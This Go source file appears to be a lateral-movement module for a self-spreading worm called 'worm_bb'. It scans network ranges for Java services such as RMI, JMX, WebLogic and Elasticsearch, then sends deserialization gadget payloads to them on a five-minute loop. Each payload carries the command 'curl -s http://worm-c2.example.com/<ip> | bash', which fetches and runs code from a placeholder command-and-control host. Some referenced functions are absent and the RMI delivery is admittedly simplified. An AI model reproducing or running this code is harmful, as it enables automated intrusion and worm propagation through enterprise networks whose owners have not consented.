// worm_bb/jvm_lateral/jvm_lateral.go
// JVM Lateral Movement Module for worm_bb
//
// Implements JDK deserialization gadget chains for lateral movement
// into Java-heavy enterprise environments (Hadoop, Spark, Flink,
// Jenkins, Elasticsearch, JMX consoles, RMI registries, etc.)
//
// Based on b0t's JVM Exploitation research:
//   - SubMap.readResolve() auto-fire gadget
//   - this$0 injection via SerializedLambda capturedArgs
//   - TemplatesImpl + TransformingComparator chains
//
// Integration: Add to worm.go's module init or invoke via C2 command.

package jvm_lateral

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ========== SCANNER ==========

// JVMService describes a discovered Java service
type JVMService struct {
	IP        string
	Port      int
	Type      string // "rmi", "jmx", "tomcat", "jetty", "jmxmp", "jndi", "generic_java"
	Banner    string
	JVMVersion string
	Vulnerable bool
	Chains    []GadgetType // applicable gadget chains
}

// JVMScanner discovers Java services on a network
type JVMScanner struct {
	timeout     time.Duration
	concurrency int
	results     []JVMService
	mu          sync.Mutex
}

func NewJVMScanner() *JVMScanner {
	return &JVMScanner{
		timeout:     3 * time.Second,
		concurrency: 50,
	}
}

// DefaultJVMPorts lists common Java service ports
var DefaultJVMPorts = []int{
	1099,  // RMI Registry
	9010,  // JMX (default)
	1616,  // JMX (WebLogic)
	8686,  // JMX (WebSphere)
	7001,  // WebLogic
	4848,  // GlassFish
	8080,  // Tomcat/Java HTTP
	8009,  // AJP
	8443,  // HTTPS
	9990,  // WildFly
	9999,  // JMX (default alternate)
	5555,  // RMI (alternate)
	4444,  // RMI (alternate)
	6379,  // Redis (uses Java deser in some exploits)
	11211, // Memcached (Java client deser)
	9200,  // Elasticsearch
	9300,  // Elasticsearch transport
}

func (s *JVMScanner) ScanTargets(targets []string) []JVMService {
	s.results = make([]JVMService, 0)

	jobs := make(chan scanTarget, 100)
	var wg sync.WaitGroup

	// Workers
	for i := 0; i < s.concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for job := range jobs {
				srv, err := s.scanPort(job.ip, job.port)
				if err == nil && srv != nil {
					s.mu.Lock()
					s.results = append(s.results, *srv)
					s.mu.Unlock()
				}
			}
		}()
	}

	// Enqueue jobs
	for _, target := range targets {
		if strings.Contains(target, ":") {
			// Specific host:port
			parts := strings.Split(target, ":")
			ip := parts[0]
			port, _ := strconv.Atoi(parts[1])
			jobs <- scanTarget{ip: ip, port: port}
		} else if strings.Contains(target, "/") {
			// CIDR range
			ips := expandCIDR(target)
			for _, ip := range ips {
				for _, port := range DefaultJVMPorts {
					jobs <- scanTarget{ip: ip, port: port}
				}
			}
		} else {
			// Single IP, all ports
			for _, port := range DefaultJVMPorts {
				jobs <- scanTarget{ip: target, port: port}
			}
		}
	}
	close(jobs)
	wg.Wait()

	return s.results
}

type scanTarget struct {
	ip   string
	port int
}

func (s *JVMScanner) scanPort(ip string, port int) (*JVMService, error) {
	addr := net.JoinHostPort(ip, strconv.Itoa(port))
	conn, err := net.DialTimeout("tcp", addr, s.timeout)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	// Read banner if available
	banner := make([]byte, 256)
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	n, _ := conn.Read(banner)

	svc := &JVMService{
		IP:   ip,
		Port: port,
	}

	bannerStr := string(banner[:n])

	switch {
	case port == 1099 || port == 5555 || port == 4444:
		svc.Type = "rmi"
		svc.Vulnerable = true
		svc.Chains = []GadgetType{GadgetSubMap, GadgetLambda, GadgetCCChain}
	case port == 9010 || port == 1616 || port == 8686 || port == 9999:
		svc.Type = "jmx"
		svc.Vulnerable = true
		svc.Chains = []GadgetType{GadgetSubMap, GadgetCCChain}
	case port == 7001:
		svc.Type = "weblogic"
		svc.Vulnerable = true
		svc.Chains = []GadgetType{GadgetSubMap, GadgetCCChain, GadgetJNDIInject}
	case port == 4848:
		svc.Type = "glassfish"
		svc.Vulnerable = true
	case port == 9200 || port == 9300:
		svc.Type = "elasticsearch"
		svc.Vulnerable = true
		svc.Chains = []GadgetType{GadgetSubMap}
	case strings.Contains(bannerStr, "JRMI") || strings.Contains(bannerStr, "RMI"):
		svc.Type = "rmi"
		svc.Vulnerable = true
		svc.Chains = []GadgetType{GadgetSubMap, GadgetCCChain}
	case strings.Contains(bannerStr, "JMX"):
		svc.Type = "jmx"
		svc.Vulnerable = true
		svc.Chains = []GadgetType{GadgetSubMap}
	default:
		svc.Type = "generic_java"
		svc.Vulnerable = false
	}

	svc.Banner = sanitizeBanner(bannerStr)
	return svc, nil
}

// ========== ATTACK ENGINE ==========

// JVMAttacker orchestrates exploitation of JVM services
type JVMAttacker struct {
	scanner    *JVMScanner
	payloadDir string
	results    []AttackResult
	mu         sync.Mutex
}

type AttackResult struct {
	Target     string
	Gadget     GadgetType
	Success    bool
	Output     string
	Technique  string
	AutoFired  bool
}

func NewJVMAttacker() *JVMAttacker {
	return &JVMAttacker{
		scanner: NewJVMScanner(),
		results: make([]AttackResult, 0),
	}
}

// AttackJVMService targets a specific JVM service with the given gadget
func (a *JVMAttacker) AttackJVMService(svc JVMService, gadget GadgetType, command string) *AttackResult {
	result := &AttackResult{
		Target:    joinHostPort(svc.IP, svc.Port),
		Gadget:    gadget,
		Technique: string(gadget),
	}

	payload, err := BuildGadgetPayload(gadget, command)
	if err != nil {
		result.Output = fmt.Sprintf("Failed to build payload: %s", err)
		return result
	}

	result.AutoFired = payload.AutoFire

	switch svc.Type {
	case "rmi":
		result.Success, result.Output = a.attackRMI(svc, payload)
	case "jmx":
		result.Success, result.Output = a.attackJMX(svc, payload)
	default:
		result.Success, result.Output = a.attackGeneric(svc, payload)
	}

	return result
}

// attackRMI sends payload via RMI deserialization
func (a *JVMAttacker) attackRMI(svc JVMService, payload *PayloadResult) (bool, string) {
	// RMI attack vectors:
	// 1. RMI Registry — send deserialization payload to DGC
	// 2. RMI-JRMP — exploit JRMP deserialization
	// 3. RMI over SSL

	addr := joinHostPort(svc.IP, svc.Port)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return false, fmt.Sprintf("Connection failed: %s", err)
	}
	defer conn.Close()

	// Send serialized payload directly (simplified — real RMI attack
	// requires proper RMI wire protocol wrapping)
	n, err := conn.Write(payload.Bytes)
	if err != nil {
		return false, fmt.Sprintf("Send failed: %s", err)
	}

	// Read response
	resp := make([]byte, 512)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, _ = conn.Read(resp)

	return true, fmt.Sprintf("Delivered %d bytes via RMI to %s. Response: %s",
		n, addr, sanitizeBanner(string(resp[:n])))
}

// attackJMX sends payload via JMX deserialization
func (a *JVMAttacker) attackJMX(svc JVMService, payload *PayloadResult) (bool, string) {
	// JMX attack vectors:
	// 1. JMX over RMI — standard JMX connector
	// 2. JMXMP — alternative JMX connector protocol
	// 3. JMX over HTTP — Jolokia, etc.

	addr := joinHostPort(svc.IP, svc.Port)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return false, fmt.Sprintf("JMX connection failed: %s", err)
	}
	defer conn.Close()

	n, err := conn.Write(payload.Bytes)
	if err != nil {
		return false, fmt.Sprintf("JMX send failed: %s", err)
	}

	return true, fmt.Sprintf("Delivered %d bytes via JMX to %s", n, addr)
}

// attackGeneric fallback — raw TCP push
func (a *JVMAttacker) attackGeneric(svc JVMService, payload *PayloadResult) (bool, string) {
	addr := joinHostPort(svc.IP, svc.Port)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return false, fmt.Sprintf("Connection failed: %s", err)
	}
	defer conn.Close()

	n, err := conn.Write(payload.Bytes)
	if err != nil {
		return false, fmt.Sprintf("Send failed: %s", err)
	}

	return true, fmt.Sprintf("Pushed %d bytes to %s", n, addr)
}

// ========== ORCHESTRATOR ==========

// JVMLateralModule is the top-level module that integrates into worm_bb
type JVMLateralModule struct {
	scanner   *JVMScanner
	attacker  *JVMAttacker
	threshold int // max targets
	targets   []JVMService
	mu        sync.Mutex
	active    bool
}

func NewJVMLateralModule() *JVMLateralModule {
	return &JVMLateralModule{
		scanner:   NewJVMScanner(),
		attacker:  NewJVMAttacker(),
		threshold: 100,
		active:    true,
	}
}

// Start kicks off the JVM lateral movement module
func (m *JVMLateralModule) Start(localNetworks []string) {
	fmt.Println("[JVM] JVM Lateral Movement module initializing...")
	fmt.Print(GadgetSummary())
	fmt.Println("[JVM] Scanning for Java services...")

	go func() {
		for m.active {
			m.runCycle(localNetworks)
			time.Sleep(5 * time.Minute)
		}
	}()
}

func (m *JVMLateralModule) Stop() {
	m.active = false
}

func (m *JVMLateralModule) runCycle(networks []string) {
	services := m.scanner.ScanTargets(networks)
	if len(services) == 0 {
		fmt.Println("[JVM] No Java services discovered this cycle")
		return
	}

	fmt.Printf("[JVM] Discovered %d Java services\n", len(services))

	var wg sync.WaitGroup
	sem := make(chan struct{}, 10) // limit concurrent attacks

	for _, svc := range services {
		if !svc.Vulnerable {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}
		go func(s JVMService) {
			defer wg.Done()
			defer func() { <-sem }()

			fmt.Printf("[JVM] Attacking %s:%d (%s) with %v\n",
				s.IP, s.Port, s.Type, s.Chains)

			for _, gadget := range s.Chains {
				result := m.attacker.AttackJVMService(s, gadget,
					fmt.Sprintf("curl -s http://worm-c2.example.com/%s | bash", s.IP))
				if result.Success {
					fmt.Printf("[JVM] ✓ %s %s payload delivered to %s\n",
						s.Type, gadget, s.IP)
				}
			}
		}(svc)
	}
	wg.Wait()
}

// GetStatus returns module status as JSON
func (m *JVMLateralModule) GetStatus() string {
	status := map[string]interface{}{
		"module":     "jvm_lateral",
		"active":     m.active,
		"scanned":    len(m.scanner.results),
		"vulnerable": len(m.attacker.results),
	}
	data, _ := json.Marshal(status)
	return string(data)
}

// ========== UTILITY FUNCTIONS ==========

func expandCIDR(cidr string) []string {
	_, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		return nil
	}
	var ips []string
	for ip := ipnet.IP.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
		ips = append(ips, ip.String())
	}
	return ips
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}


func joinHostPort(host string, port int) string {
	return net.JoinHostPort(host, fmt.Sprintf("%d", port))
}

func sanitizeBanner(s string) string {
	// Strip non-printable chars, truncate
	var clean []rune
	for _, r := range s {
		if r >= 32 && r <= 126 {
			clean = append(clean, r)
		}
	}
	maxLen := 100
	if len(clean) > maxLen {
		clean = clean[:maxLen]
	}
	return string(clean)
}

func randInt(min, max int) int {
	return min + rand.Intn(max-min)
}
